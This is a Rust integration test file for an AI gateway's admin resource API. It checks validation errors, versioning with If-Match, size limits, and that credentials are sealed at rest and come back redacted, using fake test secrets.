//! Gateway resources through the generic API and `write_resource`: what is
//! stored (normalised, sealed, validated by the gateway's own schemas), what
//! is read back (redacted), and what is refused.
//!
//! Secret values use the distinctive token [`SECRET`], so "never shown"
//! assertions cannot pass by accident.

mod support;

use aisix_control_plane::auth::OperatorRole;
use aisix_control_plane::crypto::MasterKey;
use aisix_control_plane::error::ApiError;
use aisix_control_plane::resources::normalize::{rename_aliases, schema_aliases};
use aisix_control_plane::resources::store::ResourceRow;
use aisix_control_plane::resources::validate::{validate_lenient, validate_strict};
use aisix_control_plane::resources::write::{write_resource, ResourceWrite, WriteCtx, WriteOp};
use aisix_control_plane::resources::{secrets, Kind};
use aisix_core::credentials::visit_credentials;
use futures::FutureExt;
use serde_json::{json, Value};
use support::{Resp, TestCp, TEST_MASTER_KEY};
use uuid::Uuid;

/// Every credential the tests write.
const SECRET: &str = "sk-e2e-secret-91d2";
const ROTATED: &str = "sk-e2e-rotated-4c2a";

/// A logged-in operator, with requests that can carry `If-Match`.
struct Admin<'a> {
    cp: &'a TestCp,
    cookie: String,
}

impl Admin<'_> {
    async fn as_role(cp: &TestCp, role: OperatorRole) -> Admin<'_> {
        let session = cp.admin_login_seeded(role).await;
        Admin {
            cp,
            cookie: session.cookie().to_string(),
        }
    }

    async fn send(
        &self,
        method: &str,
        path: &str,
        if_match: Option<&str>,
        body: Option<Value>,
    ) -> Resp {
        let client = reqwest::Client::builder()
            .no_proxy()
            .build()
            .expect("an HTTP client");
        let method = reqwest::Method::from_bytes(method.as_bytes()).expect("an HTTP method");
        let mut request = client
            .request(method, self.cp.url(path))
            .header(reqwest::header::COOKIE, &self.cookie);
        if let Some(v) = if_match {
            request = request.header(reqwest::header::IF_MATCH, v);
        }
        if let Some(body) = body {
            request = request.json(&body);
        }
        let response = request.send().await.expect("send the request");
        let status = response.status().as_u16();
        let headers = response.headers().clone();
        let text = response.text().await.expect("read the body");
        let body = if text.is_empty() {
            Value::Null
        } else {
            serde_json::from_str(&text).unwrap_or(Value::String(text))
        };
        Resp {
            status,
            body,
            set_cookie: None,
            headers,
        }
    }

    async fn get(&self, path: &str) -> Resp {
        self.send("GET", path, None, None).await
    }

    async fn post(&self, path: &str, body: Value) -> Resp {
        self.send("POST", path, None, Some(body)).await
    }

    async fn put(&self, path: &str, if_match: Option<&str>, body: Value) -> Resp {
        self.send("PUT", path, if_match, Some(body)).await
    }

    async fn delete(&self, path: &str, if_match: Option<&str>) -> Resp {
        self.send("DELETE", path, if_match, None).await
    }

    /// `POST /admin/resources/{kind}` with `{doc}`, which must answer 201;
    /// the created resource's id.
    async fn create(&self, kind: &str, doc: Value) -> String {
        let r = self
            .post(&format!("/admin/resources/{kind}"), json!({ "doc": doc }))
            .await;
        assert_eq!(r.status, 201, "create {kind}: {r:?}");
        r.body["id"].as_str().expect("an id").to_string()
    }
}

/// The stored row: `(doc, doc as text, version, projected_version, deleted, managed_by)`.
async fn stored(
    cp: &TestCp,
    kind: &str,
    id: &str,
) -> (Value, String, i64, Option<i64>, bool, Option<String>) {
    sqlx::query_as(
        "SELECT doc, doc::text, version, projected_version, deleted, managed_by \
         FROM gw_resources WHERE kind = $1 AND id = $2::uuid",
    )
    .bind(kind)
    .bind(id)
    .fetch_one(cp.db().pool())
    .await
    .unwrap_or_else(|e| panic!("load {kind}/{id}: {e}"))
}

async fn live_count(cp: &TestCp, kind: &str) -> i64 {
    sqlx::query_scalar("SELECT count(*) FROM gw_resources WHERE kind = $1 AND NOT deleted")
        .bind(kind)
        .fetch_one(cp.db().pool())
        .await
        .expect("count rows")
}

/// Every audit row, as text.
async fn audit_text(cp: &TestCp) -> String {
    let audit: Vec<String> = sqlx::query_scalar("SELECT row_to_json(a)::text FROM audit_log a")
        .fetch_all(cp.db().pool())
        .await
        .expect("dump audit_log");
    audit.join("\n")
}

/// Everything the database holds that a secret could leak into: every
/// resource document and every audit row, as text.
async fn database_text(cp: &TestCp) -> String {
    let docs: Vec<String> = sqlx::query_scalar("SELECT doc::text FROM gw_resources")
        .fetch_all(cp.db().pool())
        .await
        .expect("dump gw_resources");
    format!("{}\n{}", docs.join("\n"), audit_text(cp).await)
}

/// `{name: value}`.
fn one_field(name: &str, value: &str) -> Value {
    let mut fields = serde_json::Map::new();
    fields.insert(name.to_string(), json!(value));
    Value::Object(fields)
}

fn ctx(cp: &TestCp) -> WriteCtx {
    WriteCtx {
        mk: MasterKey(TEST_MASTER_KEY),
        env: cp.env().clone(),
    }
}

/// A write as `write_resource` takes it, with an owned document.
enum Op {
    Create(Value),
    Replace(Value),
    Delete,
}

/// Calls `write_resource` directly, in its own transaction.
async fn write(
    cp: &TestCp,
    kind: Kind,
    id: Uuid,
    op: Op,
    expected_version: Option<i64>,
    managed_by: Option<&str>,
) -> Result<ResourceRow, ApiError> {
    let ctx = ctx(cp);
    let managed_by = managed_by.map(str::to_string);
    cp.db()
        .tx(move |conn| {
            async move {
                let op = match &op {
                    Op::Create(doc) => WriteOp::Create(doc),
                    Op::Replace(doc) => WriteOp::Replace(doc),
                    Op::Delete => WriteOp::Delete,
                };
                write_resource(
                    conn,
                    &ctx,
                    ResourceWrite {
                        kind,
                        id,
                        op,
                        expected_version,
                        managed_by: managed_by.as_deref(),
                    },
                )
                .await
            }
            .boxed()
        })
        .await
}

fn unique(prefix: &str) -> String {
    format!("{prefix}-{}", &Uuid::new_v4().simple().to_string()[..8])
}

fn provider_key(name: &str) -> Value {
    json!({"display_name": name, "provider": "openai", "api_key": SECRET})
}

fn direct_model(name: &str, provider_key_id: &str) -> Value {
    json!({
        "display_name": name,
        "provider": "openai",
        "model_name": "gpt-4o",
        "provider_key_id": provider_key_id,
    })
}

fn classic_rate_limit(name: &str) -> Value {
    json!({"name": name, "scope": "team", "scope_ref": "team-e2e", "window": "minute", "max_requests": 60})
}

/// One valid document of every kind the generic API writes, in an order in
/// which each one's references already exist, given the ids of a provider
/// key, a model and a guardrail.
fn generic_fixtures(
    provider_key_id: &str,
    model_id: &str,
    guardrail_id: &str,
) -> Vec<(Kind, Value)> {
    vec![
        (
            Kind::ProviderKeys,
            json!({"display_name": unique("acct"), "provider": "openai", "secret": SECRET, "groups": ["shared"]}),
        ),
        (Kind::Models, direct_model(&unique("chat"), provider_key_id)),
        (
            Kind::CachePolicies,
            json!({"name": unique("cache"), "applies_to_model_id": model_id, "ttl_seconds": 60}),
        ),
        (Kind::RateLimitPolicies, classic_rate_limit(&unique("rl"))),
        (
            Kind::Guardrails,
            json!({"name": unique("mod"), "kind": "openai_moderation", "api_key": SECRET}),
        ),
        (
            Kind::GuardrailAttachments,
            json!({"guardrail_id": guardrail_id, "priority": 1, "scope_type": "model", "scope_id": model_id}),
        ),
        (
            Kind::ObservabilityExporters,
            json!({
                "name": unique("otlp"),
                "kind": "otlp_http",
                "endpoint": "https://otel.example.com/v1/traces",
                "headers": {"x-honeycomb-team": SECRET},
            }),
        ),
        (
            Kind::BudgetPolicy,
            json!({"closed_grace_seconds": 60, "fail_mode": "sticky"}),
        ),
    ]
}

#[tokio::test]
async fn a_valid_model_is_stored_at_version_one_and_not_yet_projected() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    let pk = admin.create("provider_keys", provider_key("acct-v1")).await;
    let mut listener = sqlx::postgres::PgListener::connect(cp.database_url())
        .await
        .expect("connect a listener");
    listener
        .listen("gw_resources_dirty")
        .await
        .expect("listen for writes");

    let r = admin
        .post(
            "/admin/resources/models",
            json!({"doc": direct_model("chat-v1", &pk)}),
        )
        .await;
    assert_eq!(r.status, 201, "{r:?}");
    // The projector is woken by every write.
    tokio::time::timeout(std::time::Duration::from_secs(10), listener.recv())
        .await
        .expect("a gw_resources_dirty notification")
        .expect("receive it");
    let view = &r.body;
    let id = view["id"].as_str().expect("an id");
    assert!(Uuid::parse_str(id).is_ok(), "{view}");
    assert_eq!(view["kind"], "models");
    assert_eq!(view["version"], 1);
    assert_eq!(view["managed_by"], Value::Null);
    assert_eq!(view["doc"]["display_name"], "chat-v1");
    assert_eq!(view["doc"]["provider_key_id"], pk.as_str());
    assert!(view["updated_at"].is_string(), "{view}");
    assert_eq!(view["rollout"]["state"], "pending");
    assert_eq!(view["rollout"]["kine_revision"], Value::Null);

    let (doc, _, version, projected, deleted, managed_by) = stored(&cp, "models", id).await;
    assert_eq!(version, 1);
    assert_eq!(projected, None, "nothing has been projected yet");
    assert!(!deleted);
    assert_eq!(managed_by, None);
    assert_eq!(doc["model_name"], "gpt-4o");

    let r = admin.get(&format!("/admin/resources/models/{id}")).await;
    assert_eq!(r.status, 200, "{r:?}");
    assert_eq!(r.headers["etag"], "\"1\"");
    assert_eq!(r.body["doc"]["display_name"], "chat-v1");

    let r = admin.get("/admin/resources/models").await;
    assert_eq!(r.status, 200, "{r:?}");
    let items = r.body["items"].as_array().expect("items");
    assert_eq!(items.len(), 1, "{items:?}");
    assert_eq!(items[0]["id"], id);

    // Each write takes the next place in commit order.
    let seq = |id: String| {
        let pool = cp.db().pool().clone();
        async move {
            sqlx::query_scalar::<_, i64>("SELECT seq FROM gw_resources WHERE id = $1::uuid")
                .bind(id)
                .fetch_one(&pool)
                .await
                .expect("read seq")
        }
    };
    let (pk_seq, model_seq) = (seq(pk.clone()).await, seq(id.to_string()).await);
    assert!(pk_seq < model_seq, "{pk_seq} {model_seq}");
    let mut renamed = provider_key("acct-v1-renamed");
    renamed["api_key"] = json!("[REDACTED]");
    let r = admin
        .put(
            &format!("/admin/resources/provider_keys/{pk}"),
            Some("\"1\""),
            json!({"doc": renamed}),
        )
        .await;
    assert_eq!(r.status, 200, "{r:?}");
    assert!(seq(pk.clone()).await > model_seq);
}

#[tokio::test]
async fn a_document_the_strict_schema_refuses_is_422_and_not_stored() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    let pk = admin
        .create("provider_keys", provider_key("acct-strict"))
        .await;

    let mut unknown_field = direct_model("chat-strict-7c1", &pk);
    unknown_field["temperature_7c1"] = json!(1);
    let missing_name = json!({"provider": "openai", "model_name": "gpt-4o", "provider_key_id": pk});
    // A direct model may not carry a routing block: the kinds are exclusive.
    let mut two_kinds = direct_model("chat-strict-7c2", &pk);
    two_kinds["routing"] = json!({"targets": [{"model_id": Uuid::new_v4().to_string()}]});
    for doc in [unknown_field, missing_name, two_kinds] {
        let r = admin
            .post("/admin/resources/models", json!({ "doc": doc }))
            .await;
        assert_eq!(r.status, 422, "{doc}: {r:?}");
        assert_eq!(r.body["code"], "validation_failed", "{r:?}");
        let details = r.body["details"].as_array().expect("details");
        assert!(!details.is_empty(), "{r:?}");
        assert!(details[0]["message"]
            .as_str()
            .is_some_and(|m| !m.is_empty()));
    }
    assert_eq!(live_count(&cp, "models").await, 0);

    // A field no gateway knows is refused at the root of every kind the
    // generic API writes. Each fixture is accepted once the field is gone,
    // so the field is what was refused.
    let model = admin
        .create("models", direct_model("chat-strict", &pk))
        .await;
    let guardrail = admin
        .create(
            "guardrails",
            json!({"name": "kw-strict", "kind": "keyword", "patterns": [{"kind": "literal", "value": "x"}]}),
        )
        .await;
    for (kind, doc) in generic_fixtures(&pk, &model, &guardrail) {
        let path = format!("/admin/resources/{}", kind.segment());
        let before = live_count(&cp, kind.segment()).await;
        let mut unknown = doc.clone();
        unknown["unknown_field_7c1"] = json!(1);
        let r = admin.post(&path, json!({ "doc": unknown })).await;
        assert_eq!(r.status, 422, "{kind:?}: {r:?}");
        assert_eq!(r.body["code"], "validation_failed", "{kind:?}");
        assert_eq!(live_count(&cp, kind.segment()).await, before, "{kind:?}");
        admin.create(kind.segment(), doc).await;
    }
}

/// A U+0000 in a document is refused where it sits, not answered with a
/// database error.
#[tokio::test]
async fn a_nul_character_in_a_document_is_422_at_its_path() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    let in_identity = provider_key("acct\u{0}nul");
    let mut in_a_list = provider_key("acct-nul");
    in_a_list["groups"] = json!(["shared", "grp\u{0}nul"]);
    let mut in_a_key = provider_key("acct-nul");
    in_a_key["request"] = json!({"default_body_fields": {"flag\u{0}": true}});
    for (doc, path) in [
        (in_identity, "/display_name".to_string()),
        (in_a_list, "/groups/1".to_string()),
        (
            in_a_key,
            "/request/default_body_fields/flag\u{0}".to_string(),
        ),
    ] {
        let r = admin
            .post("/admin/resources/provider_keys", json!({ "doc": doc }))
            .await;
        assert_eq!(r.status, 422, "{r:?}");
        assert_eq!(r.body["code"], "validation_failed");
        assert_eq!(r.body["details"][0]["path"], path.as_str(), "{r:?}");
    }
    assert_eq!(live_count(&cp, "provider_keys").await, 0);
}

#[tokio::test]
async fn a_rate_limit_policy_mixing_both_forms_is_refused() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;

    let mut mixed = classic_rate_limit("rl-mixed");
    mixed["limits"] = json!({"rpm": 60});
    let r = admin
        .post(
            "/admin/resources/rate_limit_policies",
            json!({"doc": mixed}),
        )
        .await;
    assert_eq!(r.status, 422, "{r:?}");
    assert_eq!(r.body["code"], "validation_failed");

    // What the schema cannot express is checked too: a dimension repeated in
    // `group_by` passes the schema and fails the gateway's semantic check.
    let repeated = json!({
        "name": "rl-repeated",
        "conditions": [{"dimension": "team", "operator": "==", "value": "team-e2e"}],
        "group_by": ["member", "member"],
        "limits": {"rpm": 60},
    });
    let r = admin
        .post(
            "/admin/resources/rate_limit_policies",
            json!({"doc": repeated}),
        )
        .await;
    assert_eq!(r.status, 422, "{r:?}");
    assert!(r.body["details"].to_string().contains("group_by"), "{r:?}");
    assert_eq!(live_count(&cp, "rate_limit_policies").await, 0);

    // Either form on its own is accepted.
    admin
        .create("rate_limit_policies", classic_rate_limit("rl-classic"))
        .await;
    admin
        .create(
            "rate_limit_policies",
            json!({
                "name": "rl-conditional",
                "conditions": [{"dimension": "team", "operator": "==", "value": "team-e2e"}],
                "group_by": ["member"],
                "limits": {"rpm": 60},
            }),
        )
        .await;
    assert_eq!(live_count(&cp, "rate_limit_policies").await, 2);
}

#[tokio::test]
async fn a_model_naming_a_missing_provider_key_is_refused() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    for missing in [Uuid::new_v4().to_string(), "pk-missing-7c1".to_string()] {
        let r = admin
            .post(
                "/admin/resources/models",
                json!({"doc": direct_model("chat-orphan", &missing)}),
            )
            .await;
        assert_eq!(r.status, 422, "{r:?}");
        assert_eq!(r.body["code"], "validation_failed");
        assert_eq!(r.body["details"][0]["path"], "/provider_key_id", "{r:?}");
    }
    // A live id spelled another way references nothing: the gateway
    // compares ids as text.
    let pk = admin
        .create("provider_keys", provider_key("acct-upper"))
        .await;
    let r = admin
        .post(
            "/admin/resources/models",
            json!({"doc": direct_model("chat-orphan", &pk.to_uppercase())}),
        )
        .await;
    assert_eq!(r.status, 422, "{r:?}");
    assert_eq!(r.body["details"][0]["path"], "/provider_key_id", "{r:?}");

    // A deleted provider key is missing too.
    let pk = admin
        .create("provider_keys", provider_key("acct-gone"))
        .await;
    let r = admin
        .delete(
            &format!("/admin/resources/provider_keys/{pk}"),
            Some("\"1\""),
        )
        .await;
    assert_eq!(r.status, 200, "{r:?}");
    let r = admin
        .post(
            "/admin/resources/models",
            json!({"doc": direct_model("chat-orphan", &pk)}),
        )
        .await;
    assert_eq!(r.status, 422, "{r:?}");
    assert_eq!(r.body["details"][0]["path"], "/provider_key_id", "{r:?}");
    assert_eq!(live_count(&cp, "models").await, 0);
}

#[tokio::test]
async fn a_second_model_with_the_same_name_is_409() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    let pk = admin
        .create("provider_keys", provider_key("chat-twice"))
        .await;
    // The same name on another kind is no conflict.
    let first = admin
        .create("models", direct_model("chat-twice", &pk))
        .await;

    let r = admin
        .post(
            "/admin/resources/models",
            json!({"doc": direct_model("chat-twice", &pk)}),
        )
        .await;
    assert_eq!(r.status, 409, "{r:?}");
    assert_eq!(r.body["code"], "name_taken");
    assert_eq!(live_count(&cp, "models").await, 1);

    // Renaming another model onto the name is refused the same way.
    let other = admin
        .create("models", direct_model("chat-other", &pk))
        .await;
    let r = admin
        .put(
            &format!("/admin/resources/models/{other}"),
            Some("\"1\""),
            json!({"doc": direct_model("chat-twice", &pk)}),
        )
        .await;
    assert_eq!(r.status, 409, "{r:?}");
    assert_eq!(r.body["code"], "name_taken");

    // Once the first is deleted, its name is free again.
    let r = admin
        .delete(&format!("/admin/resources/models/{first}"), Some("\"1\""))
        .await;
    assert_eq!(r.status, 200, "{r:?}");
    admin
        .create("models", direct_model("chat-twice", &pk))
        .await;
}

#[tokio::test]
async fn a_stale_if_match_is_412_and_the_newer_doc_survives() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    let pk = admin
        .create("provider_keys", provider_key("acct-412"))
        .await;
    let path = format!("/admin/resources/provider_keys/{pk}");

    let mut newer = provider_key("acct-412");
    newer["groups"] = json!(["grp-newer-7c1"]);
    let r = admin.put(&path, Some("\"1\""), json!({"doc": newer})).await;
    assert_eq!(r.status, 200, "{r:?}");
    assert_eq!(r.body["version"], 2);

    let mut stale = provider_key("acct-412");
    stale["groups"] = json!(["grp-stale-7c1"]);
    let r = admin.put(&path, Some("\"1\""), json!({"doc": stale})).await;
    assert_eq!(r.status, 412, "{r:?}");
    assert_eq!(r.body["code"], "version_mismatch");
    assert_eq!(r.body["current_version"], 2);
    let r = admin.delete(&path, Some("\"1\"")).await;
    assert_eq!(r.status, 412, "{r:?}");

    let r = admin.get(&path).await;
    assert_eq!(r.body["version"], 2);
    assert_eq!(r.body["doc"]["groups"], json!(["grp-newer-7c1"]));
    assert_eq!(r.headers["etag"], "\"2\"");

    // An unquoted version is accepted too.
    let r = admin.put(&path, Some("2"), json!({"doc": stale})).await;
    assert_eq!(r.status, 200, "{r:?}");
    assert_eq!(r.body["version"], 3);
}

#[tokio::test]
async fn a_put_without_if_match_is_428() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    let pk = admin
        .create("provider_keys", provider_key("acct-428"))
        .await;
    let path = format!("/admin/resources/provider_keys/{pk}");

    let mut changed = provider_key("acct-428");
    changed["groups"] = json!(["grp-428-7c1"]);
    let r = admin.put(&path, None, json!({"doc": changed})).await;
    assert_eq!(r.status, 428, "{r:?}");
    assert_eq!(r.body["code"], "if_match_required");
    let r = admin.delete(&path, None).await;
    assert_eq!(r.status, 428, "{r:?}");
    assert_eq!(r.body["code"], "if_match_required");

    let (doc, _, version, _, deleted, _) = stored(&cp, "provider_keys", &pk).await;
    assert_eq!(version, 1);
    assert!(!deleted);
    assert!(doc.get("groups").is_none(), "{doc}");
}

#[tokio::test]
async fn a_document_over_one_mebibyte_is_413() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    let big = "x".repeat((1 << 20) + 1);

    let mut doc = provider_key("acct-big");
    doc["groups"] = json!([big]);
    let r = admin
        .post("/admin/resources/provider_keys", json!({ "doc": doc }))
        .await;
    assert_eq!(r.status, 413, "{r:?}");
    assert_eq!(r.body["code"], "payload_too_large");

    // `write_resource` refuses it on its own, whatever the caller's body
    // limit.
    let e = write(
        &cp,
        Kind::ProviderKeys,
        Uuid::new_v4(),
        Op::Create(doc),
        None,
        None,
    )
    .await
    .expect_err("a document over 1 MiB");
    assert_eq!(e.status, 413);
    assert_eq!(e.code, "payload_too_large");
    assert_eq!(live_count(&cp, "provider_keys").await, 0);
}

#[tokio::test]
async fn credentials_are_sealed_at_rest_and_never_read_back() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    let viewer = Admin::as_role(&cp, OperatorRole::Viewer).await;

    let pk = admin
        .create(
            "provider_keys",
            json!({
                "display_name": "acct-sealed",
                "provider": "openai",
                "api_key": SECRET,
                "api_base": format!("https://svc:{SECRET}@api.example.com/v1"),
                "request": {"default_headers": {"x-tenant-token": SECRET}},
            }),
        )
        .await;
    let guardrail = admin
        .create(
            "guardrails",
            json!({"name": "mod-sealed", "kind": "openai_moderation", "api_key": SECRET}),
        )
        .await;
    let exporter = admin
        .create(
            "observability_exporters",
            json!({
                "name": "otlp-sealed",
                "kind": "otlp_http",
                "endpoint": "https://otel.example.com/v1/traces",
                "headers": {"x-honeycomb-team": SECRET},
            }),
        )
        .await;

    let (doc, text, ..) = stored(&cp, "provider_keys", &pk).await;
    assert!(!text.contains(SECRET), "{text}");
    for value in [
        &doc["api_key"],
        &doc["request"]["default_headers"]["x-tenant-token"],
    ] {
        assert!(
            value
                .as_str()
                .is_some_and(|v| v.starts_with("aisixsealed.v1.")),
            "{doc}"
        );
    }
    assert!(
        doc["api_base"]
            .as_str()
            .is_some_and(|u| u.starts_with("https://svc:aisixsealed.v1.")
                && u.ends_with("@api.example.com/v1")),
        "{doc}"
    );
    for (kind, id) in [
        ("guardrails", &guardrail),
        ("observability_exporters", &exporter),
    ] {
        let (_, text, ..) = stored(&cp, kind, id).await;
        assert!(!text.contains(SECRET), "{kind}: {text}");
        assert!(text.contains("aisixsealed.v1."), "{kind}: {text}");
    }

    // Sealed for the slot and the row: the projector's unseal gives the
    // plaintext back, and the same value does not open as another row's.
    let mut opened = doc.clone();
    let pk_id = Uuid::parse_str(&pk).expect("a uuid");
    secrets::unseal(cp.master_key(), Kind::ProviderKeys, pk_id, &mut opened).expect("unseal");
    assert_eq!(opened["api_key"], SECRET);
    assert_eq!(
        opened["request"]["default_headers"]["x-tenant-token"],
        SECRET
    );
    assert_eq!(
        opened["api_base"],
        format!("https://svc:{SECRET}@api.example.com/v1")
    );
    let mut elsewhere = doc.clone();
    assert!(secrets::unseal(
        cp.master_key(),
        Kind::ProviderKeys,
        Uuid::new_v4(),
        &mut elsewhere
    )
    .is_err());

    for reader in [&admin, &viewer] {
        for (kind, id) in [
            ("provider_keys", &pk),
            ("guardrails", &guardrail),
            ("observability_exporters", &exporter),
        ] {
            let list = reader.get(&format!("/admin/resources/{kind}")).await;
            let one = reader.get(&format!("/admin/resources/{kind}/{id}")).await;
            for r in [&list, &one] {
                assert_eq!(r.status, 200, "{r:?}");
                let shown = r.body.to_string();
                assert!(!shown.contains(SECRET), "{shown}");
                assert!(!shown.contains("aisixsealed"), "{shown}");
                assert!(shown.contains("[REDACTED]"), "{shown}");
            }
        }
        let one = reader
            .get(&format!("/admin/resources/provider_keys/{pk}"))
            .await;
        assert_eq!(one.body["doc"]["api_key"], "[REDACTED]");
        assert_eq!(
            one.body["doc"]["api_base"],
            "https://svc:[REDACTED]@api.example.com/v1"
        );
        assert_eq!(one.body["doc"]["display_name"], "acct-sealed");
    }
}

#[tokio::test]
async fn a_provider_key_written_with_secret_is_sealed_and_reads_back_redacted() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    let viewer = Admin::as_role(&cp, OperatorRole::Viewer).await;

    let r = admin
        .post(
            "/admin/resources/provider_keys",
            json!({"doc": {"display_name": "acct-e2e-1", "provider": "openai", "secret": SECRET}}),
        )
        .await;
    assert_eq!(r.status, 201, "{r:?}");
    assert!(!r.body.to_string().contains(SECRET), "{r:?}");
    let id = r.body["id"].as_str().expect("an id").to_string();

    let (doc, text, ..) = stored(&cp, "provider_keys", &id).await;
    assert!(doc.get("secret").is_none(), "{doc}");
    assert!(
        doc["api_key"]
            .as_str()
            .is_some_and(|v| v.starts_with("aisixsealed.v1.")),
        "{doc}"
    );
    assert!(!text.contains(SECRET), "{text}");

    let r = viewer
        .get(&format!("/admin/resources/provider_keys/{id}"))
        .await;
    assert_eq!(r.status, 200, "{r:?}");
    assert_eq!(r.body["doc"]["api_key"], "[REDACTED]");
    assert!(r.body["doc"].get("secret").is_none(), "{r:?}");
    let list = viewer.get("/admin/resources/provider_keys").await;
    assert!(!list.body.to_string().contains(SECRET), "{list:?}");

    let audit = admin.get("/admin/audit").await;
    assert_eq!(audit.status, 200, "{audit:?}");
    assert!(!audit.body.to_string().contains(SECRET), "{audit:?}");
    assert!(!database_text(&cp).await.contains(SECRET));
}

#[tokio::test]
async fn both_spellings_of_one_credential_are_refused() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    let r = admin
        .post(
            "/admin/resources/provider_keys",
            json!({"doc": {"display_name": "acct-both", "provider": "openai", "api_key": SECRET, "secret": ROTATED}}),
        )
        .await;
    assert_eq!(r.status, 422, "{r:?}");
    assert_eq!(r.body["code"], "validation_failed");
    assert_eq!(r.body["details"][0]["path"], "/secret", "{r:?}");
    assert!(!r.body.to_string().contains(SECRET), "{r:?}");
    assert_eq!(live_count(&cp, "provider_keys").await, 0);
}

#[test]
fn every_credential_alias_the_schema_accepts_is_normalised() {
    // Today's one alias, read from the schema rather than written here.
    assert_eq!(
        schema_aliases(Kind::ProviderKeys),
        [("api_key".to_string(), "secret".to_string())]
    );
    let mut checked = 0;
    for kind in Kind::ALL {
        let Some(credential_kind) = kind.credential_kind() else {
            continue;
        };
        for (canonical, former) in schema_aliases(kind) {
            let mut probe = one_field(canonical, "probe");
            let mut is_slot = false;
            visit_credentials(credential_kind, &mut probe, &mut |slot, _| {
                is_slot |= slot.field_key == *canonical;
            });
            if !is_slot {
                continue;
            }
            let mut doc = one_field(former, SECRET);
            rename_aliases(kind, &mut doc).expect("one spelling");
            assert_eq!(doc, one_field(canonical, SECRET), "{kind:?}");

            // Sealing reaches the slot whichever spelling it is under, so a
            // document that skipped normalisation still keeps no plaintext.
            let mut unnormalised = one_field(former, SECRET);
            secrets::seal(
                &MasterKey(TEST_MASTER_KEY),
                kind,
                Uuid::new_v4(),
                &mut unnormalised,
            );
            assert!(!unnormalised.to_string().contains(SECRET), "{unnormalised}");
            let mut shown = one_field(former, SECRET);
            secrets::redact(kind, &mut shown);
            assert_eq!(shown, one_field(former, "[REDACTED]"), "{kind:?}");
            checked += 1;
        }
    }
    assert!(checked >= 1, "no credential alias was checked");
}

#[tokio::test]
async fn a_redacted_secret_sent_back_keeps_the_stored_one() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    let pk = admin
        .create("provider_keys", provider_key("acct-keep"))
        .await;
    let pk_id = Uuid::parse_str(&pk).expect("a uuid");
    let path = format!("/admin/resources/provider_keys/{pk}");
    let opened = |doc: &Value| {
        let mut doc = doc.clone();
        secrets::unseal(cp.master_key(), Kind::ProviderKeys, pk_id, &mut doc).expect("unseal");
        doc["api_key"].as_str().expect("an api_key").to_string()
    };

    // The document as read, saved back with one more field.
    let mut doc = admin.get(&path).await.body["doc"].clone();
    assert_eq!(doc["api_key"], "[REDACTED]");
    doc["groups"] = json!(["grp-keep-7c1"]);
    let r = admin.put(&path, Some("\"1\""), json!({ "doc": doc })).await;
    assert_eq!(r.status, 200, "{r:?}");
    let (stored_doc, ..) = stored(&cp, "provider_keys", &pk).await;
    assert_eq!(opened(&stored_doc), SECRET);
    assert_eq!(stored_doc["groups"], json!(["grp-keep-7c1"]));

    // The same under the former spelling.
    let r = admin
        .put(
            &path,
            Some("\"2\""),
            json!({"doc": {"display_name": "acct-keep", "provider": "openai", "secret": "[REDACTED]"}}),
        )
        .await;
    assert_eq!(r.status, 200, "{r:?}");
    let (stored_doc, ..) = stored(&cp, "provider_keys", &pk).await;
    assert_eq!(opened(&stored_doc), SECRET);
    assert!(stored_doc.get("secret").is_none(), "{stored_doc}");

    // A new value replaces it.
    let mut rotated = provider_key("acct-keep");
    rotated["api_key"] = json!(ROTATED);
    let r = admin
        .put(&path, Some("\"3\""), json!({ "doc": rotated }))
        .await;
    assert_eq!(r.status, 200, "{r:?}");
    let (stored_doc, ..) = stored(&cp, "provider_keys", &pk).await;
    assert_eq!(opened(&stored_doc), ROTATED);

    // Leaving it out would delete a credential the schema requires.
    let r = admin
        .put(
            &path,
            Some("\"4\""),
            json!({"doc": {"display_name": "acct-keep", "provider": "openai"}}),
        )
        .await;
    assert_eq!(r.status, 422, "{r:?}");
    assert_eq!(r.body["code"], "validation_failed");
    let (stored_doc, _, version, ..) = stored(&cp, "provider_keys", &pk).await;
    assert_eq!(version, 4);
    assert_eq!(opened(&stored_doc), ROTATED);

    // A value shaped like a sealed one is not taken from the caller.
    let mut forged = provider_key("acct-keep");
    forged["api_key"] = json!("aisixsealed.v1.AAAA");
    let r = admin
        .put(&path, Some("\"4\""), json!({ "doc": forged }))
        .await;
    assert_eq!(r.status, 422, "{r:?}");
    let (stored_doc, ..) = stored(&cp, "provider_keys", &pk).await;
    assert_eq!(opened(&stored_doc), ROTATED);
}

#[tokio::test]
async fn a_redacted_placeholder_with_nothing_stored_is_422() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    let mut doc = provider_key("acct-placeholder");
    doc["api_key"] = json!("[REDACTED]");
    let r = admin
        .post("/admin/resources/provider_keys", json!({ "doc": doc }))
        .await;
    assert_eq!(r.status, 422, "{r:?}");
    assert_eq!(r.body["code"], "validation_failed");
    assert_eq!(r.body["details"][0]["path"], "api_key", "{r:?}");
    assert_eq!(live_count(&cp, "provider_keys").await, 0);

    // On a replace, a placeholder for a slot the stored document never had
    // is refused the same way.
    let pk = admin
        .create("provider_keys", provider_key("acct-placeholder"))
        .await;
